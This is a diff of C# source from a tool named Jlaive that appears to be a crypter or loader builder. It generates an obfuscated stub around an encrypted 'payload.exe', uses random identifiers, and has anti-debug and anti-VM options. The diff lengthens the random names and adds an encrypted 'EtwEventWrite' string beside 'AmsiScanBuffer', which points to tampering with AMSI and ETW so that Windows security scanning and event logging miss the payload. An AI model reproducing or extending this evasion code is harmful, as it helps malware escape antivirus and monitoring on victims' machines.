@@ -28,16 +28,18 @@ namespace Jlaive
 
         public static string CreateCS(byte[] key, byte[] iv, EncryptionMode mode, bool antidebug, bool antivm, bool native, Random rng)
         {
-            string namespacename = RandomString(10, rng);
-            string classname = RandomString(10, rng);
-            string aesfunction = RandomString(10, rng);
-            string uncompressfunction = RandomString(10, rng);
-            string gerfunction = RandomString(10, rng);
-            string virtualprotect = RandomString(10, rng);
-            string checkremotedebugger = RandomString(10, rng);
-            string isdebuggerpresent = RandomString(10, rng);
+            string namespacename = RandomString(20, rng);
+            string classname = RandomString(20, rng);
+            string aesfunction = RandomString(20, rng);
+            string uncompressfunction = RandomString(20, rng);
+            string gerfunction = RandomString(20, rng);
+            string virtualprotect = RandomString(20, rng);
+            string checkremotedebugger = RandomString(20, rng);
+            string isdebuggerpresent = RandomString(20, rng);
 
             string amsiscanbuffer_str = Convert.ToBase64String(Encrypt(mode, Encoding.UTF8.GetBytes("AmsiScanBuffer"), key, iv));
+            string etweventwrite_str = Convert.ToBase64String(Encrypt(mode, Encoding.UTF8.GetBytes("EtwEventWrite"), key, iv));
+
             string checkremotedebugger_str = Convert.ToBase64String(Encrypt(mode, Encoding.UTF8.GetBytes("CheckRemoteDebuggerPresent"), key, iv));
             string isdebuggerpresent_str = Convert.ToBase64String(Encrypt(mode, Encoding.UTF8.GetBytes("IsDebuggerPresent"), key, iv));
             string payloadtxt_str = Convert.ToBase64String(Encrypt(mode, Encoding.UTF8.GetBytes("payload.exe"), key, iv));
@@ -51,11 +53,8 @@ namespace Jlaive
             string key_str = Convert.ToBase64String(key);
             string iv_str = Convert.ToBase64String(iv);
 
-            Assembly asm = Assembly.GetExecutingAssembly();
-            StreamReader reader = new StreamReader(asm.GetManifestResourceStream("Jlaive.Resources.Stub.cs"));
             string stub = string.Empty;
-            string stubcode = reader.ReadToEnd();
-            reader.Dispose();
+            string stubcode = Encoding.UTF8.GetString(GetEmbeddedResource("Jlaive.Resources.Stub.cs"));
 
             if (antidebug) stub += "#define ANTI_DEBUG\n";
             if (antivm) stub += "#define ANTI_VM\n";
@@ -71,6 +70,7 @@ namespace Jlaive
             stubcode = stubcode.Replace("checkremotedebugger_name", checkremotedebugger);
             stubcode = stubcode.Replace("isdebuggerpresent_name", isdebuggerpresent);
             stubcode = stubcode.Replace("amsiscanbuffer_str", amsiscanbuffer_str);
+            stubcode = stubcode.Replace("etweventwrite_str", etweventwrite_str);
             stubcode = stubcode.Replace("checkremotedebugger_str", checkremotedebugger_str);
             stubcode = stubcode.Replace("isdebuggerpresent_str", isdebuggerpresent_str);
             stubcode = stubcode.Replace("payloadtxt_str", payloadtxt_str);
